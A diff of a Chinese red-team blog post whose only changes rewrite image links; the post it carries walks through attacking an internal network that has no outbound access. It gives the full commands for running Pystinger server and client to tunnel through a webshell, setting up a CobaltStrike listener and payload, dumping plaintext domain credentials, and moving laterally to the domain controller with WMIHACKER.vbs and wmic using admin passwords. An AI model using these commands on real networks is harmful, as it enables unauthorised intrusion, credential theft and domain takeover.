@@ -26,7 +26,7 @@ __
 
 一个专注于红队攻击的公众号
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210806181644.png)  
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210806181644.png)  
   
 
 大家好，这里是  **渗透攻击红队** ** ** 的第 **68**
@@ -48,7 +48,7 @@ __
 
 首先是拿到了一个 Webshell：
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210806181645.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210806181645.png)
 
 通过初步判断当前机器 icmp 不出网：
 
@@ -69,7 +69,7 @@ php、jsp（x）、aspx 三种脚本语言！
 
 先上传对应的 Pystinger webshell 文件并成功访问：  
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210806181646.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210806181646.png)
 
 然后我们还需要将 stinger_server.exe 上传到目标服务器 ，执行如下命令：  
 
@@ -79,7 +79,7 @@ php、jsp（x）、aspx 三种脚本语言！
     
     start c:\Windows\temp\cookie\stinger_server.exe 0.0.0.0
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210806181647.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210806181647.png)
 
 然后将 stinger_client 上传到 vps ，执行如下命令  
 
@@ -89,23 +89,23 @@ php、jsp（x）、aspx 三种脚本语言！
     
     ./stinger_client -w http://saulgoodman.cn:9009//wls-wsat/proxy.jsp -l 0.0.0.0 -p 60000
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210806181648.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210806181648.png)
 
 此时已将目标服务器的 60020 端口映射到 VPS 的 60020 端口了！  
 
 这个时候我们 CobaltStrike 设置监听，http host 填写目标内网的  IP 地址：192.168.0.9，端口填写 60020:  
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210806181649.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210806181649.png)
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210806181650.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210806181650.png)
 
 然后我们生成一个 exe，监听器就是刚刚设置的那个：  
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210806181651.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210806181651.png)
 
 然后目标运行 exe 马，直接上线到 CobaltStrike：  
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210806181652.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210806181652.png)
 
   
 
@@ -115,11 +115,11 @@ php、jsp（x）、aspx 三种脚本语言！
 
 通过 nbtscan 对当前内网进行信息搜集发现当前内网是存在域环境的：
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210806181653.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210806181653.png)
 
 由于当前已经是 administrator 了，且是 Windows 2008 的机器，可以直接抓明文：
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210806181654.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210806181654.png)
 
 抓到了本地管理员和域管明文还有一些域用户的明文！既然域控是 192.168.0.2 这台，那么直接 WMI 横向把：
 
@@ -129,7 +129,7 @@ php、jsp（x）、aspx 三种脚本语言！
     
     shell cscript  c:\windows\temp\WMIHACKER.vbs /cmd 192.168.0.2 BExxxx\administrator vmxxxxx whoami 1
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210806181655.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210806181655.png)
 
 直接拿到域控 system 权限！我们还可以用系统自带的 WMI 来执行命令，只不过命令不回显：
 
@@ -139,25 +139,25 @@ php、jsp（x）、aspx 三种脚本语言！
     
     wmic /node:192.168.0.2 /user:BEHxxxx\administrator /password:vm$xxxx process call create "cmd.exe /c ipconfig > c:\result.txt"            type \\192.168.0.2\c$\result.txt
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210806181656.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210806181656.png)
 
 这篇文章主要就是想表达不出网也是可以对它进行内网渗透的，并不是遇到不出网环境就不能打内网，方法很多，知识面还是会决定你的杀伤链！
 
   
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210806181657.png)  
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210806181657.png)  
 
 渗透攻击红队
 
 一个专注于渗透红队攻击的公众号
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210806181658.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210806181658.png)
 
   
 
   
 
-![]()点分享![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210806181659.png)点点赞![]()点在看
+![]()点分享![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210806181659.png)点点赞![]()点在看
 
 预览时标签不可点
 
